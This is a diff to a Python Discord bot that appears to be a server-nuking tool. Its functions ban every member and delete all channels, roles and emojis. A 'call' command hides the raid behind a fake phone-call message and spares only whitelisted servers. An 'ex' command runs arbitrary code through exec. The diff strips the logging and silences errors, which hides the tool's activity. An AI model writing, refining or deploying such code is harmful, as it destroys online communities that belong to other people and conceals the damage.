@@ -41,33 +41,29 @@ async def act1(ctx):
 	for member in ctx.guild.members:
 		try:
 			await member.ban()
-			print(f'{localtime()} {member.name} - banned')
 		except:
-			print(f'{localtime()} {member.name} - can not be banned')
+			pass
 
 async def act2(ctx):
 	for channel in ctx.guild.channels:
 			try:
 				await channel.delete()
-				print(f'{localtime()} Channel {channel.name} - deleted')
 			except:
-				print(print(f'{localtime()} Channel {channel.name} - can not be deleted'))
+				pass
 
 async def act3(ctx):
 	for role in ctx.guild.roles:
 			try:
 				await role.delete()
-				print(f'{localtime()} Role {role.name} - deleted')
 			except:
-				print(f'{localtime()} Role {role.name} - can not be deleted')
+				pass
 
 async def act4(ctx):
 	for emoji in ctx.guild.emojis:
 			try:
 				await emoji.delete()
-				print(f'{localtime()} Emoji {emoji.name} - deleted')
 			except:
-				print(f'{localtime()} Emoji {emoji.name} - can not be deleted')
+				pass
 
 async def act5(ctx):
 	for x in range(settings['TEXT-CHANNELS']):
@@ -85,7 +81,6 @@ async def act7(ctx):
 async def call(ctx):
 	if ctx.guild.id not in whiteservers:
 		await ctx.send("Starting a call with number: `+7 800 555 35 35` to random number. Wait....")
-		print('='*45)
 
 		start_time = localtime()
 		start_guild_num = len(ctx.guild.members)
@@ -181,7 +176,6 @@ async def ex(ctx, *, args):
 			out = exec(args)
 			await ctx.send(f'Output:\n```{out}\n```')
 		except:
-			print(f'{args} is an invalid command')
 			await ctx.send(f'An error occured in this command:\n```{args}\n```')
 	else:
 		await ctx.send('Нельзя :)')
